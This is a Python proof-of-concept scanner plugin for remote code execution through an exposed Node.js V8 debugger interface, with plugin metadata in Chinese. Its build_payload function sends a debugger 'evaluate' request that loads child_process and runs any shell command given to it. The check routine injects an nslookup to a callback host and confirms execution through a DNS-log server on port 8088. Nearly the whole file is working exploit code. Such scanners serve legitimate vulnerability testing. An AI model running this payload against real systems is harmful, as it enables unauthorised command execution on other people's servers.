# coding:utf-8
# author:nearg1e

''' poc for nodejs v8 debugger remote code execute '''

import socket
import string
import random
import time
try:
    import urllib2
except Exception as e:
    import urllib.request as urllib2

def get_plugin_info():
    plugin_info = {
        "name": "Nodejs Debugger 远程代码执行漏洞",
        "info": "Nodejs V8 Debugger 调试接口可被外部访问，造成远程命令执行",
        "level": "高危",
        "type": "命令执行",
        "author": "neargle",
        "keyword": "banner:V8-Version",
        "source": 1
    }
    return plugin_info

def build_payload(cmd=""):
        payload = u'''{
            "seq": 1,
            "type": "request",
            "command": "evaluate",
            "arguments": {
                "expression": "(function(){var require=global.require||global.process.mainModule.constructor._load;if(!require)return;var exec=require(\\"child_process\\").exec;function execute(command,callback){exec(command,function(error,stdout,stderr){callback(stdout)})}execute(\\"''' + cmd + '''\\",console.log)})()",
                "global": true,
                "maxStringLength": -1
            }
        }'''
        data = u"Content-Length: {}\r\n\r\n".format(len(payload)) + payload
        return data.encode()


def ip_address(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((ip, port))
    (addr, port) = sock.getsockname()
    sock.close()
    return addr


def dnslog_check(server, hash_str):
    url = "http://{}:8088/{}".format(server, hash_str)
    try:
        content = urllib2.urlopen(url, timeout=5).read()
    except Exception as e:
        return False
    else:
        if 'YES' in content:
            return True
    return False
    


def random_str(length):
    pool = string.digits + string.ascii_lowercase
    return "".join(random.choice(pool) for _ in range(length))


def check(ip, port, timeout):
    socket.setdefaulttimeout(timeout)
    server = ip_address(ip, port)
    check_str = random_str(16)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, int(port)))
        command = "nslookup {} {}".format(check_str, server)
        sock.send(build_payload(command))
    except Exception as e:
        pass
    else:
        time.sleep(2)
        if dnslog_check(server, check_str):
            return u"nodejs 远程命令执行漏洞"


if __name__ == '__main__':
    print(check("127.0.0.1", 5858, 10))
        
